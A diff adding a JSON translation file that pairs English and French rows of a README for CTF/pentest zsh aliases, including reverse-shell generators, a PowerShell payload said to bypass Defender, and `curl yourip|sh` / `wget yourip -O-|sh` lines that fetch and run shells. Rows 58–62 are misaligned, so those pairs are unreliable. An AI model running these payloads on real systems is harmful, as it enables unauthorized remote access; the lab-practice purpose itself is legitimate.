@@ -1,0 +1,1640 @@
+[
+  {
+    "row": 1,
+    "rowsha": "p+sWgdjfK1miGwl24mDhDjbR3h7KXBYonWGxK4W7vCs=",
+    "originContent": "# Stuff for CTFs, HTB, THM etc",
+    "translatedContent": "# Trucs pour CTFs, HTB, THM etc"
+  },
+  {
+    "row": 2,
+    "rowsha": "YY6L24ef/eaq/BCK6ExdWizZUx6H0GU0q2ByWC5i38Y=",
+    "originContent": "Contains aliases and scripts I often use. Just clone this repo **in your home folder** and run `echo \"source ~/zsh-aliases/aliases.zsh\" >> ~/.zshrc`. After restarting zsh you should be able to use all aliases and scripts. Only tested on Kali Linux, you might need to install additional dependencies on other distros. ",
+    "translatedContent": "Contient des alias et des scripts que j’utilise souvent. Clonez simplement ce dépôt **dans votre dossier personnel** et exécutez `echo \"source ~/zsh-aliases/aliases.zsh\" >> ~/.zshrc`. Après avoir redémarré zsh, vous devriez pouvoir utiliser tous les alias et scripts. Testé uniquement sur Kali Linux, vous pourriez avoir besoin d’installer des dépendances supplémentaires sur d’autres distributions. "
+  },
+  {
+    "row": 3,
+    "rowsha": "dpm+07m58gWR65dPEpz8PFKC313zXWfm4vFPv8FiGDI=",
+    "originContent": "> #### Disclaimer",
+    "translatedContent": "> #### Avertissement"
+  },
+  {
+    "row": 4,
+    "rowsha": "LegO6JHuf4mHZUD5wnaIJbB2ae24F6q76GmvKQFBnDA=",
+    "originContent": "> Most of those aliases probably suck, feel free to submit a pull request reducing the pepeganess. For me the fact that it works is enough to use them for now :D",
+    "translatedContent": "> La plupart de ces alias sont probablement nuls, n’hésitez pas à soumettre une demande de tirage pour réduire le côté pepegan. Pour moi, le fait que ça fonctionne suffit pour les utiliser pour l’instant :D"
+  },
+  {
+    "row": 5,
+    "rowsha": "IDl7IVTeldq+zk09MQBtmdLtaugodLNVSOpRc2CwBAI=",
+    "originContent": "## Misc",
+    "translatedContent": "## Divers"
+  },
+  {
+    "row": 6,
+    "rowsha": "Ajdzeorvh0QCF9lW26/WRrlriIkF/dFza6zQdd4XxQI=",
+    "originContent": "### > www",
+    "translatedContent": "### > www"
+  },
+  {
+    "row": 7,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 8,
+    "rowsha": "d8Y9lGBt5X3HW6bt4CQc/kwRbABEbefpJ/m3WcArNhs=",
+    "originContent": "Starts a HTTP server on port 80 in the current directory. Also prints a list of the IP address associated with each NIC, shows the current directory path and lists the files. ",
+    "translatedContent": "Démarre un serveur HTTP sur le port 80 dans le répertoire courant. Affiche également une liste des adresses IP associées à chaque interface réseau, montre le chemin du répertoire courant et liste les fichiers. "
+  },
+  {
+    "row": 9,
+    "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+    "originContent": "Example: ",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 10,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 11,
+    "rowsha": "OSGTEUlgm6mvczT3eq0nWq2+0YhTIoJOsMGD+2bV9WU=",
+    "originContent": "┌──(jazz㉿kali)-[/tmp/www]",
+    "translatedContent": "┌──(jazz㉿kali)-[/tmp/www]"
+  },
+  {
+    "row": 12,
+    "rowsha": "l7ecQ7iBL00jFzq8S4GB3uW5HEmBf5Er/Zv3mnZycVo=",
+    "originContent": "└─$ www",
+    "translatedContent": "└─$ www"
+  },
+  {
+    "row": 13,
+    "rowsha": "gomYoufck9bZq9fAiu8+or4bjzwcBSPeCfoUiZS4KY0=",
+    "originContent": "[eth0] 192.168.172.128",
+    "translatedContent": "[eth0] 192.168.172.128"
+  },
+  {
+    "row": 14,
+    "rowsha": "6I7Z5f8s6/ymsOB7/X/jKt7tSu3ItjOE15oN92iOkE8=",
+    "originContent": "[/tmp/www]",
+    "translatedContent": "[/tmp/www]"
+  },
+  {
+    "row": 15,
+    "rowsha": "d6EHUGoatn3m7WWaAosLp1sdUZwhvsKH0ZfPm6KEG1o=",
+    "originContent": "linpeas.sh  pspy64",
+    "translatedContent": "linpeas.sh  pspy64"
+  },
+  {
+    "row": 16,
+    "rowsha": "vn2IxSCs+nYEEiHYr+KdtFi11fqSRGTyGJReFZdZSiM=",
+    "originContent": "Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...",
+    "translatedContent": "Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..."
+  },
+  {
+    "row": 17,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 18,
+    "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+    "originContent": "> #### Notes",
+    "translatedContent": "> #### Notes"
+  },
+  {
+    "row": 19,
+    "rowsha": "L44C2Kw4koewMHBcbEY6BSygqBIC85JNISTcS7BW3qc=",
+    "originContent": "> - Sudo is used to ensure being able to listen on port 80",
+    "translatedContent": "> - Sudo est utilisé pour garantir la possibilité d'écouter sur le port 80"
+  },
+  {
+    "row": 20,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 21,
+    "rowsha": "DjmCWn8PtMPwz0Y3mpigPTU868/Hx+lklGH+w5vh9Y4=",
+    "originContent": "### > tun0",
+    "translatedContent": "### > tun0"
+  },
+  {
+    "row": 22,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 23,
+    "rowsha": "SA6kQYAtUJ3qkd4g8OeEJvtuVIotn4AJSgpbl4EqSCc=",
+    "originContent": "Copies the IP addres of the tun0 interface to the clipboard. ",
+    "translatedContent": "Copie l'adresse IP de l'interface tun0 dans le presse-papiers. "
+  },
+  {
+    "row": 24,
+    "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+    "originContent": "Example: ",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 25,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 26,
+    "rowsha": "3Nbqaxj9q0temKwXiCmSuJraBpFNdeVnuKKY5gDrf7Q=",
+    "originContent": "┌──(jazz㉿kali)-[~/jazz]",
+    "translatedContent": "┌──(jazz㉿kali)-[~/jazz]"
+  },
+  {
+    "row": 27,
+    "rowsha": "a1Y9SOQhHdzAMqVa3DfmJ4JNSyuxqcdIEWhHnYZKnmw=",
+    "originContent": "└─$ tun0 ",
+    "translatedContent": "└─$ tun0 "
+  },
+  {
+    "row": 28,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 29,
+    "rowsha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+    "originContent": "Clipboard contents after:",
+    "translatedContent": "Contenu du presse-papiers après :"
+  },
+  {
+    "row": 30,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 31,
+    "rowsha": "Ay3w23NBoYQ6AzviIPPtVMw69B/sihQrN9d3QMr3hc8=",
+    "originContent": "10.10.14.41",
+    "translatedContent": "10.10.14.41"
+  },
+  {
+    "row": 32,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 33,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 34,
+    "rowsha": "qAEb1I85uZoXGRaSDD0i5Lk5fCrG5qUB1wM9SkCMAMQ=",
+    "originContent": "### > mkdir_cd",
+    "translatedContent": "### > mkdir_cd"
+  },
+  {
+    "row": 35,
+    "rowsha": "8CemvUjYkdq4ODVky9g/UvNXR8lj+VKKLeAzRl11MIM=",
+    "originContent": "Often when making a directory I want to directly `cd` into it after. This does exactly that.  ",
+    "translatedContent": "Souvent, lorsque je crée un répertoire, je veux directement y `cd` par la suite. Ceci fait exactement cela.  "
+  },
+  {
+    "row": 36,
+    "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+    "originContent": "Example: ",
+    "translatedContent": "Exemple : "
+  },
+  {
+    "row": 37,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 38,
+    "rowsha": "3Nbqaxj9q0temKwXiCmSuJraBpFNdeVnuKKY5gDrf7Q=",
+    "originContent": "┌──(jazz㉿kali)-[~/jazz]",
+    "translatedContent": "┌──(jazz㉿kali)-[~/jazz]"
+  },
+  {
+    "row": 39,
+    "rowsha": "sMDYLvZ0h3YEhS1vwpj5KWM/nKyod33FTNeGwB/GaTI=",
+    "originContent": "└─$ mkdir_cd pepega",
+    "translatedContent": "└─$ mkdir_cd pepega"
+  },
+  {
+    "row": 40,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 41,
+    "rowsha": "Fd9OMLq53AAOZZxwQZqtJqMMKB40pgSfVQfjo1XECQ4=",
+    "originContent": "┌──(jazz㉿kali)-[~/jazz/pepega]",
+    "translatedContent": "┌──(jazz㉿kali)-[~/jazz/pepega]"
+  },
+  {
+    "row": 42,
+    "rowsha": "F+6YnjTNo87QSn0gITfCLF9XwCbciGaaCSzPlrzCpy0=",
+    "originContent": "└─$ ",
+    "translatedContent": "└─$ "
+  },
+  {
+    "row": 43,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 44,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 45,
+    "rowsha": "Bjbe9nx7QrTtAlRUklfdfO4fqHgButTkHK/DwW8E3sQ=",
+    "originContent": "## Reverse shells",
+    "translatedContent": "## Shells inversés"
+  },
+  {
+    "row": 46,
+    "rowsha": "lM4EmGylzx+tXrec9iRwtgsPNHWfGyGkaJX5o9Qod0A=",
+    "originContent": "### > gen_lin_rev $ip $port ",
+    "translatedContent": "### > gen_lin_rev $ip $port "
+  },
+  {
+    "row": 47,
+    "rowsha": "FGkMQ6Fg2FUYvJfZlcpitRBl1/UBr4WsELoaq60ABgQ=",
+    "originContent": "Based on [RSaaS](https://github.com/lukechilds/reverse-shell). Creates a file called `index.html` in the current directory. This file contains multiple reverse shell payloads that will be attempted in sequence until one works. Can be used with `www` to make spawning a reverse shell after gaining RCE extremely easy and fast. Just make the target execute `curl yourip|sh` and it will retrieve the reverse shell payload from your webserver and -hopefully- connect back to your listener. ",
+    "translatedContent": "Basé sur [RSaaS](https://github.com/lukechilds/reverse-shell). Crée un fichier appelé `index.html` dans le répertoire courant. Ce fichier contient plusieurs charges utiles de shell inversé qui seront tentées en séquence jusqu'à ce qu'une fonctionne. Peut être utilisé avec `www` pour rendre la génération d'un shell inversé après obtention d'une RCE extrêmement facile et rapide. Il suffit de faire exécuter au cible `curl votreip|sh` et il récupérera la charge utile du shell inversé depuis votre serveur web et -espérons-le- se connectera à votre écouteur. "
+  },
+  {
+    "row": 48,
+    "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+    "originContent": "Example: ",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 49,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 50,
+    "rowsha": "ty/x6ZluZLABP4RO1uWEAPF20EpOg76E7Cx+tFfpg/c=",
+    "originContent": "┌──(jazz㉿kali)-[~]",
+    "translatedContent": "┌──(jazz㉿kali)-[~]"
+  },
+  {
+    "row": 51,
+    "rowsha": "AhRA+47Cm/K93CTCiRvetHS1C1SiQWb8jqZZ24stwZ4=",
+    "originContent": "└─$ gen_lin_rev 127.0.0.1 1337",
+    "translatedContent": "└─$ gen_lin_rev 127.0.0.1 1337"
+  },
+  {
+    "row": 52,
+    "rowsha": "PnXRb/QSlXVKBEbLk0TdupdiH8Eeae1ThB8EaVyKTxY=",
+    "originContent": "[+] Wrote Linux reverse shells to /home/jazz/index.html",
+    "translatedContent": "[+] Wrote Linux reverse shells to /home/jazz/index.html"
+  },
+  {
+    "row": 53,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 54,
+    "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+    "originContent": "> #### Notes",
+    "translatedContent": "> #### Notes"
+  },
+  {
+    "row": 55,
+    "rowsha": "oUBk4FfNI0iMsvKWCtVZHl1VEYf9yBVNPxERVeBupp8=",
+    "originContent": "> - I really like how the `curl yourip|sh` payload doesn't really have any badchars besides possibly the space and the pipe. When spaces form an issue there are [ways around this](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces) and the pipe can be bypassed by just downloading and executing separately.",
+    "translatedContent": "> - J'aime vraiment la façon dont la charge utile `curl yourip|sh` ne contient presque pas de caractères interdits à part peut-être l'espace et le pipe. Lorsque les espaces posent problème, il existe [des moyens de contourner cela](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces) et le pipe peut être contourné en téléchargeant et en exécutant séparément."
+  },
+  {
+    "row": 56,
+    "rowsha": "QlERH1P3Jj9dWUQgwwiOf5+90DBryWaRbBXaUAGMCoA=",
+    "originContent": "> - If curl is not installed on the remote machine you can try `wget yourip -O-|sh`",
+    "translatedContent": "> - Si curl n'est pas installé sur la machine distante, vous pouvez essayer `wget yourip -O-|sh`"
+  },
+  {
+    "row": 57,
+    "rowsha": "Nqnn8clbgv+5l0PgxcTOldg8mkMKrFn4TvPL+rYUUGg=",
+    "originContent": " ",
+    "translatedContent": " "
+  },
+  {
+    "row": 58,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": "### > gen_php_rev $ip $port"
+  },
+  {
+    "row": 59,
+    "rowsha": "KzCrb6A1L0A9+DaXEtZpvdALyw1LEg/EoXZ1KPZrQkA=",
+    "originContent": "### > gen_php_rev $ip $port",
+    "translatedContent": ""
+  },
+  {
+    "row": 60,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": "Génère le [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) avec l'ip et le port fournis et le sauvegarde dans le répertoire courant.  "
+  },
+  {
+    "row": 61,
+    "rowsha": "rl9TLwOsSGEolZie8y8KN1r95+OxG4QeO1tsfU7k1cE=",
+    "originContent": "Generates the [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) with the supplied ip and port and saves it in the current directory.  ",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 62,
+    "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+    "originContent": "Example: ",
+    "translatedContent": ""
+  },
+  {
+    "row": 63,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 64,
+    "rowsha": "ty/x6ZluZLABP4RO1uWEAPF20EpOg76E7Cx+tFfpg/c=",
+    "originContent": "┌──(jazz㉿kali)-[~]",
+    "translatedContent": "┌──(jazz㉿kali)-[~]"
+  },
+  {
+    "row": 65,
+    "rowsha": "TYepdWhFeGKmMhm2iA6byylI287GMnxSBPW5Y97ECkU=",
+    "originContent": "└─$ gen_php_rev 127.0.0.1 1337                                                              ",
+    "translatedContent": "└─$ gen_php_rev 127.0.0.1 1337                                                              "
+  },
+  {
+    "row": 66,
+    "rowsha": "8UDkLxYNyuuxKddLRhI6CxizXos/7krY8209Nvr+W9Q=",
+    "originContent": "[+] Wrote PHP reverse shell to /home/jazz/jazz.php",
+    "translatedContent": "[+] Wrote PHP reverse shell to /home/jazz/jazz.php"
+  },
+  {
+    "row": 67,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 68,
+    "rowsha": "7IFmQQMXQrXc2mQtCyOdOR2SDGtIJb4weteu66X6MdI=",
+    "originContent": "### > gen_ps_rev $ip $port",
+    "translatedContent": "### > gen_ps_rev $ip $port"
+  },
+  {
+    "row": 69,
+    "rowsha": "dPeMQIfdXe18lMipL7AUIp+pj2UtpjxGataNA/gfivo=",
+    "originContent": "Generates a Powershell reverse shell with the supplied ip and port which at the moment of last usage bypassed defender. I'm not sure who to give credit for this payload. ",
+    "translatedContent": "Génère un shell inverse Powershell avec l’IP et le port fournis, qui au moment de la dernière utilisation contournait Defender. Je ne sais pas à qui attribuer ce payload. "
+  },
+  {
+    "row": 70,
+    "rowsha": "hyiH5WPnWVf/wgsCEzJQTy3dCo85ZMuTBwhjv68Tza0=",
+    "originContent": "Example:",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 71,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 72,
+    "rowsha": "ty/x6ZluZLABP4RO1uWEAPF20EpOg76E7Cx+tFfpg/c=",
+    "originContent": "┌──(jazz㉿kali)-[~]",
+    "translatedContent": "┌──(jazz㉿kali)-[~]"
+  },
+  {
+    "row": 73,
+    "rowsha": "wMwu60pkeM576zsQm4LpTx0tSHOSLKFbkvyUZDnLlzE=",
+    "originContent": "└─$ gen_ps_rev 127.0.0.1 1337",
+    "translatedContent": "└─$ gen_ps_rev 127.0.0.1 1337"
+  },
+  {
+    "row": 74,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 75,
+    "rowsha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+    "originContent": "Clipboard contents after:",
+    "translatedContent": "Contenu du presse-papiers après :"
+  },
+  {
+    "row": 76,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 77,
+    "rowsha": "mk/J8gaI0SWJYHdFnjg+P9ghbOxT78/1Z7ZNaGELp80=",
+    "originContent": "powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...",
+    "translatedContent": "powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A..."
+  },
+  {
+    "row": 78,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 79,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 80,
+    "rowsha": "IzNKjgdoP0EoE89ltdFhJ+kdk6VOtab9yGYeybWnl0c=",
+    "originContent": "## TTY upgrades",
+    "translatedContent": "## Mises à niveau TTY"
+  },
+  {
+    "row": 81,
+    "rowsha": "ht4fyYc7YUwJ5HV/slXGcHlEwSptZBC+Ye9ZZ7+wxDk=",
+    "originContent": "### > uptty",
+    "translatedContent": "### > uptty"
+  },
+  {
+    "row": 82,
+    "rowsha": "9d0Eld+b/5XJhzMzZRwouJgABOG31YFYO/9UYvQtQHI=",
+    "originContent": "Copies the python(2) and python3 tty upgrade command to the clipboard. ",
+    "translatedContent": "Copie la commande de mise à niveau tty python(2) et python3 dans le presse-papiers. "
+  },
+  {
+    "row": 83,
+    "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+    "originContent": "Example: ",
+    "translatedContent": "Exemple : "
+  },
+  {
+    "row": 84,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 85,
+    "rowsha": "3Nbqaxj9q0temKwXiCmSuJraBpFNdeVnuKKY5gDrf7Q=",
+    "originContent": "┌──(jazz㉿kali)-[~/jazz]",
+    "translatedContent": "┌──(jazz㉿kali)-[~/jazz]"
+  },
+  {
+    "row": 86,
+    "rowsha": "1TFP0B23DPhJ85Uq8KXQrfl1o5HTrINJdexKjjoKjCY=",
+    "originContent": "└─$ uptty",
+    "translatedContent": "└─$ uptty"
+  },
+  {
+    "row": 87,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 88,
+    "rowsha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+    "originContent": "Clipboard contents after:",
+    "translatedContent": "Contenu du presse-papiers après :"
+  },
+  {
+    "row": 89,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 90,
+    "rowsha": "0lrDxl1jinzh1w1T2eTUm5FI5vw1Tf6Z9q64Y5yA9CY=",
+    "originContent": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'",
+    "translatedContent": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+  },
+  {
+    "row": 91,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 92,
+    "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+    "originContent": "> #### Notes",
+    "translatedContent": "> #### Notes"
+  },
+  {
+    "row": 93,
+    "rowsha": "DGzaomT1caRomTXbWtkFX/buH+8pvd7J1VrEtW3va4Y=",
+    "originContent": "> - Requires `xclip` to be installed",
+    "translatedContent": "> - Nécessite que `xclip` soit installé"
+  },
+  {
+    "row": 94,
+    "rowsha": "AqjAEuFg77Q2KUgT4unUVmTvI8Ef7yxUbyx9MHVhzNs=",
+    "originContent": "> - `py_tty_upgrade` and `py3_tty_upgrade` are still included for now but will call this alias instead",
+    "translatedContent": "> - `py_tty_upgrade` et `py3_tty_upgrade` sont encore inclus pour le moment mais appelleront cet alias à la place"
+  },
+  {
+    "row": 95,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 96,
+    "rowsha": "eUxABB0l7Fq3v9YTtUq22Lxd2HWpA7o5CqnaUNOLBeo=",
+    "originContent": "### > script_tty_upgrade",
+    "translatedContent": "### > script_tty_upgrade"
+  },
+  {
+    "row": 97,
+    "rowsha": "AsHzs+Cmr7eYMnpSwXFa5J0CEd+jZLGbqJ2sekannMA=",
+    "originContent": "When Python is not installed on the remote machine you can use this command to copy the `script` method to upgrade to a tty shell to your clipboard. ",
+    "translatedContent": "Lorsque Python n'est pas installé sur la machine distante, vous pouvez utiliser cette commande pour copier la méthode `script` afin de passer à un shell tty dans votre presse-papiers. "
+  },
+  {
+    "row": 98,
+    "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+    "originContent": "Example: ",
+    "translatedContent": "Exemple : "
+  },
+  {
+    "row": 99,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 100,
+    "rowsha": "3Nbqaxj9q0temKwXiCmSuJraBpFNdeVnuKKY5gDrf7Q=",
+    "originContent": "┌──(jazz㉿kali)-[~/jazz]",
+    "translatedContent": "┌──(jazz㉿kali)-[~/jazz]"
+  },
+  {
+    "row": 101,
+    "rowsha": "+20e6VOmG1efTHQ6pOBUqgohdj80gYLkFWBAj3qplRk=",
+    "originContent": "└─$ script_tty_upgrade",
+    "translatedContent": "└─$ script_tty_upgrade"
+  },
+  {
+    "row": 102,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 103,
+    "rowsha": "rpMJSR4OugK9UadFmgKl0o76P4Rl+E9N5fddewIh7xY=",
+    "originContent": "Clipboard contents after:",
+    "translatedContent": "Contenu du presse-papiers après :"
+  },
+  {
+    "row": 104,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 105,
+    "rowsha": "GHOvmGHK6qYD/iH1zKGsSGueVW+edx/E/fiWl8Am+lg=",
+    "originContent": "/usr/bin/script -qc /bin/bash /dev/null",
+    "translatedContent": "/usr/bin/script -qc /bin/bash /dev/null"
+  },
+  {
+    "row": 106,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 107,
+    "rowsha": "dQCZJ+rPK84NtkOiTXjBrePnXrkMcOLX+lqAphOVNis=",
+    "originContent": "> #### Notes",
+    "translatedContent": "> #### Notes"
+  },
+  {
+    "row": 108,
+    "rowsha": "DGzaomT1caRomTXbWtkFX/buH+8pvd7J1VrEtW3va4Y=",
+    "originContent": "> - Requires `xclip` to be installed",
+    "translatedContent": "> - Nécessite que `xclip` soit installé"
+  },
+  {
+    "row": 109,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 110,
+    "rowsha": "AMlhJCjqNEc9CsxqdIdCNIVUrFMdolNQFYLP/YzQv+Q=",
+    "originContent": "### > tty_fix",
+    "translatedContent": "### > tty_fix"
+  },
+  {
+    "row": 111,
+    "rowsha": "P6718zD6CFHeIvl8g/oWvwvuqG0UWLevFBOh1aDlCw0=",
+    "originContent": "Runs `stty raw -echo; fg; reset` should be used after using one of the above tty upgrades.",
+    "translatedContent": "Exécute `stty raw -echo; fg; reset` qui doit être utilisé après avoir appliqué l’une des améliorations tty ci-dessus."
+  },
+  {
+    "row": 112,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 113,
+    "rowsha": "Dochc4YNZ0/YlpcaNrHuXSg1uvzu0iRVoqYMgSL+3rM=",
+    "originContent": "### > tty_conf",
+    "translatedContent": "### > tty_conf"
+  },
+  {
+    "row": 114,
+    "rowsha": "yky50z9BPQoIgCZ9Y3GyOj+8haHCZbmdpP0AmoCPhkE=",
+    "originContent": "Grabs the current tty settings (number of rows and columns) and copies a oneliner to the clipboard that can be pasted straight into your reverse shell window to get those settings to match up. This fixes the issue of line wrapping occuring halfway in your terminal. ",
+    "translatedContent": "Récupère les paramètres tty actuels (nombre de lignes et de colonnes) et copie un one-liner dans le presse-papiers qui peut être collé directement dans votre fenêtre de shell inverse pour que ces paramètres correspondent. Cela résout le problème de retour à la ligne qui se produit au milieu de votre terminal.  "
+  },
+  {
+    "row": 115,
+    "rowsha": "L9LdvICEovOlzyjbXgiwsgyqHNUG9it0rXkGostv//Q=",
+    "originContent": "Example: ",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 116,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 117,
+    "rowsha": "3Nbqaxj9q0temKwXiCmSuJraBpFNdeVnuKKY5gDrf7Q=",
+    "originContent": "┌──(jazz㉿kali)-[~/jazz]",
+    "translatedContent": "┌──(jazz㉿kali)-[~/jazz]"
+  },
+  {
+    "row": 118,
+    "rowsha": "Dss3DMlb7Jini+xbu3unCCD3iSoEH1va2p52pgX6hbE=",
+    "originContent": "└─$ tty_conf               ",
+    "translatedContent": "└─$ tty_conf               "
+  },
+  {
+    "row": 119,
